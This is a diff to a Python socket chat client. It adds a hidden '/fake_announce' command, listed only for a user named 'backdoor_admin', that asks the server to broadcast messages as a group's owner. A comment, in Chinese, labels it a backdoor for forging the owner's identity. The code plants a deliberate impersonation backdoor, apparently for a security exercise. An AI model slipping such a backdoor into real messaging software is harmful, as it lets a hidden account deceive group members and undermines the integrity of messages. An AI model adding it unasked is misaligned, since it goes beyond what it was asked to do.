@@ -86,6 +86,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     print("  /list_group - List all groups")
     print("  /msg_group <group> <message> - Send message to group")
     print("  /delete_group <name> - Delete a group (creator only)")
+    if name == "backdoor_admin":
+        print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
     print("  /quit - Exit")
     receive_thread = threading.Thread(target=receive_messages, args=(s,), daemon=True)
     receive_thread.start()
@@ -213,6 +215,23 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 }
                 s.sendall(json.dumps(group_cmd).encode())
                 continue
+                        # ===== Backdoor: 伪造群主身份发送群公告 =====
+            fake_announce_match = re.match(r'/fake_announce\s+(\S+)\s+(.+)', cmd)
+            if fake_announce_match:
+                group_name = fake_announce_match.group(1)
+                fake_msg = fake_announce_match.group(2)
+
+                fake_cmd = {
+                    "from": name,
+                    "to": "server",
+                    "payload": f"/fake_announce {group_name} {fake_msg}",
+                    "payload_type": "command",
+                    "timestamp": datetime.now().isoformat()
+                }
+
+                s.sendall(json.dumps(fake_cmd).encode())
+                continue
+
             print("Unknown command. Available commands:")
             print("  /list - List online users")
             print("  /msg <user> <content> - Send message to user")
@@ -222,6 +241,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             print("  /list_group - List all groups")
             print("  /msg_group <group> <message> - Send message to group")
             print("  /delete_group <name> - Delete a group (creator only)")
+            if name == "backdoor_admin":
+                print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
             print("  /quit - Exit")
         except KeyboardInterrupt:
             print("\nDisconnecting...")
